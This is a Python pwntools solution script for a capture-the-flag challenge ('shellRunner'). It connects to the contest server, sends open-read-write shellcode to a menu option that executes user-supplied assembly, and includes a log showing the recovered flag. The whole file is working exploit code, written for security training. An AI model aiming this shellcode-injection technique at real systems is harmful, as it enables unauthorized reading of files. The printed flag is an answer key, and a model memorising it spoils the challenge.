from pwn import *

# 1. 设置目标架构和环境
context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug' # 如果想看详细的交互过程，取消注释这行

# 2. 连接远程服务器
host = 'svtctf.m0lecon.it'
port = 13429
io = remote(host, port)

# 3. 构造 ORW Shellcode (读取当前目录下的 flag)
# 逻辑：open('flag', 0) -> read(fd, rsp, 100) -> write(1, rsp, 100)
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('rax', 'rsp', 100) # rax 是 open 返回的文件描述符
shellcode += shellcraft.write(1, 'rsp', 100)

payload = asm(shellcode)

# 4. 按照程序的菜单进行交互
try:
    # 选择选项 4: Run user-provided assembly code
    io.sendlineafter(b"Choose an option:", b"4")
    
    # 输入 Shellcode 的大小
    io.sendlineafter(b"Enter the size of your shellcode:", str(len(payload)).encode())
    
    # 发送机器码
    io.sendafter(b"Enter your shellcode:", payload)
    
    # 5. 获取结果
    print("\n--- 正在尝试获取 Flag ---")
    # 接收剩余的所有输出
    result = io.recvall(timeout=2)
    print(result.decode(errors='ignore'))
    
except EOFError:
    print("\n[!] 连接已断开，可能是 Shellcode 触发了非法指令或沙箱限制。")

finally:
    io.close()

#(pwn_env) hanabi@polito:~/svt_ctf/round_2/shellRunner$ python3 solution.py 
#[+] Opening connection to svtctf.m0lecon.it on port 13429: Done

#--- 正在尝试获取 Flag ---
#[+] Receiving all data: Done (101B)
#[*] Closed connection to svtctf.m0lecon.it port 13429
#svt{Sup3rS3cur3_Sh3llc0d3_Executor_KOlq9BKJ3DJdAEAs}